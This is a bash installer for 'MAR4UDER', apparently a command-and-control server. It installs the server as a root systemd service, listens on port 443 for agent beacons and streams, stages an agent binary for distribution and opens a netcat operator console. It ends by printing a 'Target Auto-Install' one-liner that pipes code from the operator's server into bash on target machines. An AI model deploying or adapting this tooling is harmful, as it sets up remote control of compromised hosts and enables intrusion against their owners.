#!/usr/bin/env bash
set -e

# ==============================================================================
# MAR4UDER Server Universal 1-Line Installer for VPS / Linux
# ==============================================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
BOLD='\033[1m'
NC='\033[0m'

echo -e "${CYAN}${BOLD}"
echo "===================================================================="
echo "         MAR4UDER // SERVER & CONTROL PLANE AUTO-INSTALLER          "
echo "===================================================================="
echo -e "${NC}"

# 1. Require root or sudo
if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}[-] Please run as root or with sudo:${NC} sudo bash $0"
  exit 1
fi

# 2. Detect script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

# 3. Detect Package Manager
echo -e "${CYAN}[*] Checking build dependencies...${NC}"
PKG_CMD=""
if command -v apt-get &>/dev/null; then
  PKG_CMD="apt"
elif command -v dnf &>/dev/null; then
  PKG_CMD="dnf"
elif command -v yum &>/dev/null; then
  PKG_CMD="yum"
elif command -v pacman &>/dev/null; then
  PKG_CMD="pacman"
elif command -v apk &>/dev/null; then
  PKG_CMD="apk"
fi

# 4. Check or build binary
SERVER_BIN="/usr/local/bin/mar4uder-server"

# Stop existing service if running
if systemctl is-active --quiet mar4uder-server 2>/dev/null; then
  echo -e "${YELLOW}[*] Stopping existing mar4uder-server service...${NC}"
  systemctl stop mar4uder-server || true
fi

# If precompiled linux binary is present in directory, use it
if [ -f "$SCRIPT_DIR/mar4uder-server-linux" ]; then
  echo -e "${GREEN}[+] Using precompiled Linux server binary...${NC}"
  cp "$SCRIPT_DIR/mar4uder-server-linux" "$SERVER_BIN"
elif [ -f "$SCRIPT_DIR/mar4uder-server" ]; then
  echo -e "${GREEN}[+] Using local server binary...${NC}"
  cp "$SCRIPT_DIR/mar4uder-server" "$SERVER_BIN"
else
  # Compile from source using Go
  if ! command -v go &>/dev/null; then
    echo -e "${YELLOW}[*] Go compiler not detected. Installing golang...${NC}"
    case "$PKG_CMD" in
      apt)
        apt-get update -y && apt-get install -y golang git libcap2-bin curl
        ;;
      dnf|yum)
        $PKG_CMD install -y golang git libcap curl
        ;;
      pacman)
        pacman -Sy --noconfirm go git libcap curl
        ;;
      apk)
        apk add --no-cache go git libcap curl
        ;;
      *)
        echo -e "${RED}[-] Unable to auto-install Go. Please install go >= 1.20 manually.${NC}"
        exit 1
        ;;
    esac
  fi

  echo -e "${CYAN}[*] Building mar4uder-server from Go sources...${NC}"
  go build -v -o "$SERVER_BIN" .
fi

chmod 755 "$SERVER_BIN"

# Install agent binary for distribution (/i and /bin/agent)
if [ -f "$SCRIPT_DIR/bin/mar4uder_agent" ]; then
  echo -e "${GREEN}[+] Installing agent binary for automatic distribution...${NC}"
  cp "$SCRIPT_DIR/bin/mar4uder_agent" /usr/local/bin/mar4uder_agent
  chmod 755 /usr/local/bin/mar4uder_agent
elif [ -f "$SCRIPT_DIR/mar4uder_agent" ]; then
  echo -e "${GREEN}[+] Installing agent binary from current directory...${NC}"
  cp "$SCRIPT_DIR/mar4uder_agent" /usr/local/bin/mar4uder_agent
  chmod 755 /usr/local/bin/mar4uder_agent
fi

# Enable binding to privileged ports (<1024) without requiring root user
if command -v setcap &>/dev/null; then
  setcap 'cap_net_bind_service=+ep' "$SERVER_BIN" 2>/dev/null || true
fi

# 5. Create Configuration Directory & Config
CONFIG_DIR="/etc/mar4uder"
CONFIG_FILE="$CONFIG_DIR/config.json"
mkdir -p "$CONFIG_DIR"

if [ ! -f "$CONFIG_FILE" ]; then
  echo -e "${CYAN}[*] Generating secure configuration at $CONFIG_FILE...${NC}"
  # Generate random 32-char hex token
  RAND_TOKEN=$(head -c 16 /dev/urandom 2>/dev/null | xxd -p 2>/dev/null || tr -dc 'a-f0-9' < /dev/urandom | head -c 32)
  cat << EOF > "$CONFIG_FILE"
{
  "http_addr": "0.0.0.0:8080",
  "udp_addr": "0.0.0.0:443",
  "tcp_addr": "0.0.0.0:443",
  "auth_token": "$RAND_TOKEN",
  "node_online_timeout_sec": 15
}
EOF
  chmod 600 "$CONFIG_FILE"
else
  echo -e "${GREEN}[+] Keeping existing configuration at $CONFIG_FILE${NC}"
fi

# 6. Install Systemd Service
SERVICE_FILE="/etc/systemd/system/mar4uder-server.service"
echo -e "${CYAN}[*] Installing systemd service unit...${NC}"
cat << EOF > "$SERVICE_FILE"
[Unit]
Description=MAR4UDER Server Control Plane & Gateway
After=network.target network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
WorkingDirectory=$CONFIG_DIR
ExecStart=$SERVER_BIN -config $CONFIG_FILE
Restart=always
RestartSec=3
LimitNOFILE=65536

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable mar4uder-server
systemctl restart mar4uder-server

# 7. Extract Details & Detect VPS IP
TOKEN=$(grep '"auth_token"' "$CONFIG_FILE" | head -n 1 | awk -F '"' '{print $4}')
HTTP_PORT=$(grep '"http_addr"' "$CONFIG_FILE" | head -n 1 | awk -F ':' '{print $NF}' | tr -d '", ')
UDP_PORT=$(grep '"udp_addr"' "$CONFIG_FILE" | head -n 1 | awk -F ':' '{print $NF}' | tr -d '", ')

VPS_IP=$(curl -s --max-time 3 https://api.ipify.org 2>/dev/null || curl -s --max-time 3 https://ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
if [ -z "$VPS_IP" ]; then
  VPS_IP="<YOUR_VPS_IP>"
fi

echo -e "\n${GREEN}${BOLD}====================================================================${NC}"
echo -e "${GREEN}${BOLD}   MAR4UDER SERVER SUCCESSFULLY INSTALLED AND ACTIVE!              ${NC}"
echo -e "${GREEN}${BOLD}====================================================================${NC}"
echo -e " ${BOLD}Web Console:${NC}       http://${VPS_IP}:${HTTP_PORT}"
echo -e " ${BOLD}Operator Console (NC):${NC}  nc ${VPS_IP} 9000  (or: python nc.py ${VPS_IP} 9000)"
echo -e " ${BOLD}Auth Token:${NC}        ${TOKEN}"
echo -e " ${BOLD}Agent Beacon UDP:${NC}  ${VPS_IP}:${UDP_PORT}"
echo -e " ${BOLD}Agent Stream TCP:${NC}  ${VPS_IP}:443"
echo -e "--------------------------------------------------------------------"
echo -e " ${BOLD}1-Line Target Auto-Install:${NC}"
echo -e "   ${CYAN}curl -s http://${VPS_IP}:${HTTP_PORT}/i | bash${NC}"
echo -e " ${BOLD}Manual Node Connection:${NC}"
echo -e "   ./mar4uder_agent ${VPS_IP}:${UDP_PORT} my-node-name"
echo -e "--------------------------------------------------------------------"
echo -e " Service management:"
echo -e "   systemctl status mar4uder-server"
echo -e "   systemctl restart mar4uder-server"
echo -e "   journalctl -u mar4uder-server -f"
echo -e "${GREEN}====================================================================${NC}\n"
